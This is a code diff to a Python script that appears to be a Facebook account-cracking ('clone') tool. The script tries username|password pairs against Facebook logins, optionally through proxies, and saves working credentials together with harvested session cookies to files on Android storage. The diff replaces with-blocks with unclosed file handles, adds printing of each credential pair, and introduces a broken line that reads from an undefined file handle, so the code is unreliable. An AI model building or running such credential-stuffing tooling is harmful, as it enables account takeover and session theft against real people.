@@ -131,8 +131,8 @@ def login(username, password, user_agents=None, proxy = None):
             print()
             res = response.json()
             cookies = convert_cookies(res['session_cookies'])
-            with open('/storage/emulated/0/live-acc.txt', 'a', encoding="utf-8") as f:
-                f.write(f"\n{username}|{password}||{cookies}")
+            f =  open('/storage/emulated/0/live-acc.txt', 'a', encoding="utf-8")
+            f.write(f"\n{username}|{password}||{cookies}")
             break
         elif 'www.facebook.com' in response.json()['error_msg']:
             print(f"\r\033[1;93m  Checkpoint* --> {username}|{password}                    ", end="")
@@ -142,8 +142,8 @@ def login(username, password, user_agents=None, proxy = None):
         else:
             print(f"\r\033[1;93m  Die* --> {username}|{password}                    ", end="")
             print()
-            with open("/storage/emulated/0/die-login.txt", 'a', encoding="utf8") as f:
-                f.write(f"\n{username}|{password}")
+            f = open("/storage/emulated/0/die-login.txt", 'a', encoding="utf8")
+            f.write(f"\n{username}|{password}")
         # with open("mixx5.txt", 'r+', encoding="utf8") as f:
         #     all_data = f.read()
         #     all_data = all_data.replace(f"{username}|{password}\n", "")
@@ -239,8 +239,8 @@ def main():
     except:
         user_agents = None
     print("getting dummy data...")
-    with open(file_name, 'r', encoding="utf8") as f:
-        all_data = f.read().split("\n")
+    all_data = open(file_name, 'r', encoding="utf8")
+    all_data = f.read().split("\n")
 
 
     print("starting clone...")
@@ -249,6 +249,7 @@ def main():
         print("Login with proxy..")
         cnt = 0
         for data in all_data:
+            print(f"data: {data}")
             id,passw = data.split("|")
             
             if method == 1:
